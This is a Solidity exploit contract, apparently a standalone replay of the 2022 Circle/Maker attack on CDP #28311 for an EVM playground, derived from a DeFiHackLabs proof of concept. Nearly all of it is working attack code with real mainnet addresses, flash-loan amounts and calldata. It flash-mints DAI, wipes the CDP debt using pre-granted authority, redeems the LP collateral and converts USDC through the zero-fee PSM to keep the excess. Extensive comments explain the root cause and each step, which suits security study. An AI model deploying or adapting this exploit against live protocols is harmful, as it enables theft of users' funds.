// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2022-08-Circle_exp2).
//
// The DeFiHackLabs PoC (test/Circle_exp2.sol) runs the attack INLINE in the
// Foundry test contract: the test IS the Maker flash-loan receiver, and the
// whole close-CDP → burn-LP → PSM-sellGem sequence happens inside onFlashLoan.
// There is no standalone exploit contract to deploy. This file is a faithful,
// self-contained copy of that inline attack so the playground can record it.
//
// The exploit is ETCHED at the historical attack-contract address
// 0xfd51531B26f9bE08240f7459EeA5BE80D5B047D9, which holds the CDP-manager
// authority over CDP #28311 (`cdpAllow(28311, 0xfd51…, 1)` granted before the
// attack). In the Foundry test this authority is borrowed via two `vm.prank`
// calls around manager.frob / manager.flux; by running the whole exploit AT
// that address, msg.sender is naturally 0xfd51… and no prank is needed. Logic
// and constants are copied verbatim from test/Circle_exp2.sol.
//
// Root cause: a mis-administered, over-collateralized CDP (#28311, ilk
// UNIV2DAIUSDC-A) whose authority had been granted to an attacker-controlled
// address. The attacker flash-mints DAI, repays the CDP debt for free, pulls
// the LP collateral, burns it for DAI+USDC, and converts the USDC half to DAI
// through the zero-fee PSM (DssPsm.sellGem, tin=0) — repaying the flash loan
// and keeping ~151,669 USDC of over-collateralization as pure profit.

// VULNERABILITY: CDP Authority Misuse on Overcollateralized UNIV2DAIUSDC-A Position (CDP #28311)
// [detailed explanation with code references]
// The core issue is operational: before the attack, `cdpAllow(28311, 0xfd51531B26f9bE08240f7459EeA5BE80D5B047D9, 1)` was called
// on the DssCdpManager (0x5ef30b9986345249bc32d8928B7ee64DE9435E39). This grants the listed address full control
// equivalent to the owner for frob/flux operations on that CDP ID (see IMakerManager.frob and .flux below).
// No on-chain check prevented an authorized (but untrusted) party from wiping the entire debt and withdrawing
// all collateral when the position was over-collateralized (ink value in LP > art * rate debt).
// The CDP used the UNIV2DAIUSDC-A ilk, backed by Uniswap V2 LP tokens (UNIV2_DAI_USDC = 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5)
// which entitle the holder to a share of DAI+USDC reserves. Because the position was over-collateralized,
// closing it via frob(-ink, -art) released LP collateral whose redemption value exceeded the repaid DAI debt.
// The attacker did not need to be the original owner; the granted authority was sufficient.
// Additionally, the DssPsm (0x89B78CfA322F6C5dE0aBcEecab66Aee45393cC5A) had `tin=0` (see DssPsm.sol:113,169):
//   uint256 public tin; // toll in [wad]
//   ...
//   uint256 fee = mul(gemAmt18, tin) / WAD;
//   uint256 daiAmt = sub(gemAmt18, fee);
// This made sellGem a perfect 1:1 (post-decimal) swap from USDC -> DAI with zero fee, allowing the attacker
// to convert the USDC leg of the burned LP into exactly the DAI needed to top up the flash repayment while
// pocketing the residual USDC.
// Related contracts (from sources/):
// - DssPsm.sellGem uses AuthGemJoin5.join (which requires auth, but PSM is authed) then internal Vat.frob to
//   mint the DAI.
// - GemJoin.exit (for the LP collateral) and AuthGemJoin5 are thin adapters; the real power comes from the
//   CDP manager authority + flash + PSM fee config.
// The flash loan is from Maker's DssFlash (MAKER_FLASH), which flash-mints DAI (no collateral needed for the flash itself).
// Impact: ~151k USDC drained as profit; original CDP owner lost the excess collateral that had backed their position.
// The attack is atomic within one flash loan callback; no capital required upfront.

// EXPLOIT STEPS:
// 1. Attacker deploys (or etches) CircleExploit at the pre-authorized address 0xfd51... (in this PoC the contract
//    is the receiver and is "deployed" at that addr via etch in the test harness).
// 2. Call run() which triggers Maker flashLoan(DAI, FLASH_AMOUNT=~7.313e21, data=cdpId encoded).
// 3. Maker DssFlash mints the DAI to the receiver and calls onFlashLoan.
// 4. Inside onFlashLoan:
//    a. Query urn handler via manager.urns(CDP_ID) and Vat.urns(ILK, urn) to read current ink/art (L102-103).
//    b. Join flash-minted DAI into Vat for the urn handler via DaiJoin (L109-112).
//    c. Execute frob(CDP_ID, dink=-ink, dart=-art) to repay all debt and free all collateral (L116).
//    d. flux + GemJoin.exit to pull LP tokens to attacker (L118-122).
//    e. Burn LP on Uniswap pair -> receive DAI + USDC (L124-126).
//    f. sellGem(USDC portion) via PSM (tin=0) -> receive DAI (L128-129).
//    g. Approve flash module for repayment; return magic bytes32 (L132).
// 5. Flash loan is repaid from the DAI balance (from LP burn + PSM); residual USDC remains as profit.
// 6. Attacker keeps the excess USDC; CDP is now empty/closed.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IMakerPool {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
}

struct Urn {
    uint256 ink; // Locked Collateral  [wad]
    uint256 art; // Normalised Debt    [wad]
}

interface IMakerVat {
    function urns(bytes32, address) external view returns (Urn memory);
    function ilks(bytes32) external view returns (uint256 Art, uint256 rate, uint256 spot, uint256 line, uint256 dust);
}

interface IMakerManager {
    function urns(uint256) external view returns (address);
    function flux(uint256, address, uint256) external;
    function frob(uint256, int256, int256) external;
    // NOTE: These functions (frob/flux) are permissioned inside the real DssCdpManager
    // by a mapping of (cdpId => (usr => ok)). The exploit works solely because that
    // ok bit was set for the attack address via cdpAllow before the tx.
}

interface IGemJoin {
    function exit(address, uint256) external;
}

interface IUniswapV2Pair {
    function burn(address) external returns (uint256, uint256);
}

interface IDssPsm {
    function sellGem(address, uint256) external;
    // VULNERABILITY: sellGem is callable by anyone (no access control) and its
    // effective rate is controlled solely by the tin parameter (settable by auth).
    // When tin=0 the conversion is frictionless, enabling the exact balancing
    // needed to extract the LP imbalance as profit after CDP closure.
}

contract CircleExploit {
    // --- mainnet constants (verbatim from test/Circle_exp2.sol) ---
    address private constant MAKER_FLASH = 0x1EB4CF3A948E7D72A198fe073cCb8C7a948cD853;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address private constant MAKER_CDP_MANAGER = 0x5ef30b9986345249bc32d8928B7ee64DE9435E39;
    address private constant MCD_JOIN_DAI = 0x9759A6Ac90977b93B58547b4A71c78317f391A28;
    address private constant MCD_VAT = 0x35D1b3F3D7966A1DFe207aa4514C12a259A0492B;
    address private constant GEM_JOIN = 0xA81598667AC561986b70ae11bBE2dd5348ed4327; // UNIV2DAIUSDC-A adapter
    address private constant UNIV2_DAI_USDC = 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5; // LP token / pair
    address private constant DSS_PSM = 0x89B78CfA322F6C5dE0aBcEecab66Aee45393cC5A;

    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant AUTH_GEM_JOIN5 = 0x0A59649758aa4d66E25f08Dd01271e891fe52199; // PSM USDC adapter

    // ilk UNIV2DAIUSDC-A (bytes32 from the test)
    bytes32 private constant ILK = 0x554e495632444149555344432d41000000000000000000000000000000000000;

    // VULNERABILITY: Hardcoded reliance on pre-granted CDP authority + exact state snapshot
    // CDP #28311 whose authority was granted to this contract's address.
    // The attack only succeeds because 0xfd51... already had cdpAllow rights; the contract
    // does not create the authorization — it only uses the one that existed on-chain.
    uint256 private constant CDP_ID = 28_311;
    // Flash-mint amount = the CDP's outstanding DAI debt (art × rate / RAY).
    uint256 private constant FLASH_AMOUNT = 7_313_820_511_466_897_574_539_490;
    // USDC to route through the zero-fee PSM: sized so the recombined DAI exactly
    // repays the flash loan, leaving the residual USDC as profit.
    uint256 private constant SELL_GEM_USDC = 3_580_348_695_472;
    // Maker flash callback return value (keccak256("ERC3156FlashBorrower.onFlashLoan")).
    bytes32 private constant FLASH_CALLBACK = 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9;

    // step 0: flash-mint DAI from the Maker flash module; the callback does the attack.
    // VULNERABILITY: Flash-mint DAI via Maker DssFlash (no collateral check on flash itself)
    // The flash module trusts the receiver to return funds in same tx; used here to source the exact
    // debt repayment without the attacker posting any DAI upfront. Data payload carries CDP ID for
    // historical fidelity (though not parsed in this standalone version).
    function run() external {
        // bytes data encodes cdpId (28311) + 0, as in the test.
        bytes memory data =
            "0x0000000000000000000000000000000000000000000000000000000000006e970000000000000000000000000000000000000000000000000000000000000000";
        IMakerPool(MAKER_FLASH).flashLoan(address(this), DAI, FLASH_AMOUNT, data);
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
        address urnsAddress = IMakerManager(MAKER_CDP_MANAGER).urns(CDP_ID);
        Urn memory urn = IMakerVat(MCD_VAT).urns(ILK, urnsAddress);

        int256 dink = 0 - int256(urn.ink);
        int256 dart = 0 - int256(urn.art);

        // VULNERABILITY: Querying urn state directly from Vat to compute exact wipe amounts
        // [code references: L102-103, struct Urn at L38]
        // The position's ink (LP collateral locked) and art (normalized debt) are public.
        // Because CDP authority was pre-granted, the attacker can read the live numbers and
        // craft -ink/-art deltas that completely close the urn (no dust left). This would be
        // impossible without the cdpAllow grant.

        // Deposit the flash-minted DAI into the Vat for the urnHandler.
        uint256 amountDai = IERC20(DAI).balanceOf(address(this));
        IERC20(DAI).approve(MCD_JOIN_DAI, amountDai);
        // Note: the test calls IMakerManager(MCD_JOIN_DAI).join — DaiJoin.join.
        IMakerJoinLike(MCD_JOIN_DAI).join(urnsAddress, amountDai);

        // VULNERABILITY: Full position wipe via CDP Manager frob using granted authority
        // [code ref: IMakerManager.frob at L50, executed at L116]
        // frob(id, dink, dart) with negative values decreases both collateral and debt.
        // The Manager forwards to Vat.frob after permission check (which passes because
        // this address was cdpAllowed). No additional owner signature or re-collateralization
        // required once authority exists. This is the step that "repays the CDP debt for free"
        // (using attacker's flash DAI, which is later reclaimed from LP redemption + PSM).
        // Repay debt & unlock collateral (msg.sender == this contract == the
        // authorized operator of CDP #28311 — replaces the test's vm.prank).
        IMakerManager(MAKER_CDP_MANAGER).frob(CDP_ID, dink, dart);
        // Move the freed collateral to this contract inside the Vat.
        IMakerManager(MAKER_CDP_MANAGER).flux(CDP_ID, address(this), urn.ink);
        // Pull the LP token out of the Vat.
        IGemJoin(GEM_JOIN).exit(address(this), urn.ink);

        // VULNERABILITY: LP collateral redemption + burn to extract asymmetric assets
        // [code ref: UniswapV2Pair.burn at sources/.../UniswapV2Pair.sol:429]
        // The LP token (UNIV2DAIUSDC) when burned returns proportional reserves of BOTH
        // DAI and USDC. The original debt was only DAI-denominated. The excess collateral
        // manifests as the USDC component (plus any DAI remainder). By burning the full ink,
        // attacker obtains raw tokens whose combined value > flash debt.
        // Burn the LP for both underlying assets.
        IERC20(UNIV2_DAI_USDC).transfer(UNIV2_DAI_USDC, urn.ink);
        IUniswapV2Pair(UNIV2_DAI_USDC).burn(address(this));

        // VULNERABILITY: Zero-fee USDC->DAI conversion via DssPsm (tin==0)
        // [code ref: DssPsm.sellGem at sources/DssPsm_.../DssPsm.sol:167]
        //   gemJoin.join(...) then vat.frob(...) then daiJoin.exit
        // Because tin=0, fee=0 and daiAmt == gemAmt18 (scaled). This lets the attacker
        // convert precisely the USDC leg into the DAI needed to finish repaying the
        // flash loan while leaving the "over-collateralization profit" in USDC on hand.
        // The SELL_GEM_USDC constant is sized exactly for this (see L88).
        // Convert the USDC half to DAI through the zero-fee PSM.
        IERC20(USDC).approve(AUTH_GEM_JOIN5, type(uint256).max);
        IDssPsm(DSS_PSM).sellGem(address(this), SELL_GEM_USDC);

        // Approve the flash module to pull the DAI back at the end of the tx.
        IERC20(DAI).approve(MAKER_FLASH, type(uint256).max);
        return FLASH_CALLBACK;
    }
}

// Minimal interface for DaiJoin.join (the test casts MCD_JOIN_DAI to IMakerManager
// and calls .join(addr, uint); DaiJoin exposes join(address,uint)).
interface IMakerJoinLike {
    function join(address, uint256) external;
}
